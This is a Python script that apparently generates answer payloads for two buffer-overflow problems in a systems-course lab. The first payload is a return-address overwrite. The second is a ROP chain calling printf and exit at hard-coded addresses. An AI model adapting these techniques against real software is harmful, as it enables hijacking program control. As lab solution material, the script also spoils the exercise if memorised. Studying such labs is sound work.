#!/usr/bin/env python3
"""
Generate payload files used for Problem1 and Problem2 exploits.

This script reproduces the exact binary payloads used during the
laboratory run. It is intentionally explicit about addresses and layout
so you can audit and adapt the payloads.

Usage:
  python3 scripts/generate_payloads.py

Outputs:
  - ans1.txt
  - ans2.txt
"""
from pathlib import Path

OUT_DIR = Path(__file__).resolve().parents[1]

def write_ans1():
    """
    Problem1 payload (minimal overwrite to ret address).
    Layout used in the experiment:
      - 16 bytes padding (b'A'*16)
      - 4 bytes: target address (little-endian)
    Notes:
      - The binary used in the experiment accepted this 20-byte file and
        returned control to the target function that prints the success message.
    """
    target_path = OUT_DIR / "ans1.txt"
    padding = b"A" * 16
    # Address chosen from static analysis: 0x00401216 (low 4 bytes written)
    # We write exactly the same 4-byte sequence that was used interactively.
    target_function_low4 = b"\x16\x12\x40\x00"
    payload = padding + target_function_low4
    target_path.write_bytes(payload)
    print(f"wrote {target_path} ({len(payload)} bytes)")

def write_ans2():
    """
    Problem2 payload (ROP chain).
    High-level layout:
      - 16 bytes padding to align with saved rbp/ret location
      - 8 bytes: pop rdi; ret gadget address
      - 8 bytes: pointer to the rodata string "Yes!I like ICS!\n"
      - 8 bytes: small 'ret' gadget for alignment
      - 8 bytes: printf@plt
      - 8 bytes: exit@plt
      - pad up to 56 bytes because the vulnerable memcpy copies 0x38 (56) bytes
    Addresses (from static analysis / objdump):
      pop_rdi       = 0x4012c7
      rodata_string = 0x40203b
      ret_gadget    = 0x4012c8
      printf_plt    = 0x4010d0
      exit_plt      = 0x401120
    """
    target_path = OUT_DIR / "ans2.txt"
    padding = b"A" * 16
    pop_rdi = (0x4012c7).to_bytes(8, "little")
    rodata_string = (0x40203b).to_bytes(8, "little")
    ret_gadget = (0x4012c8).to_bytes(8, "little")
    printf_plt = (0x4010d0).to_bytes(8, "little")
    exit_plt = (0x401120).to_bytes(8, "little")

    payload = padding + pop_rdi + rodata_string + ret_gadget + printf_plt + exit_plt
    # Ensure the file is at least 56 bytes because memcpy in the target copies 0x38 bytes.
    if len(payload) < 56:
        payload += b"B" * (56 - len(payload))

    target_path.write_bytes(payload)
    print(f"wrote {target_path} ({len(payload)} bytes)")

def main():
    write_ans1()
    write_ans2()

if __name__ == "__main__":
    main()


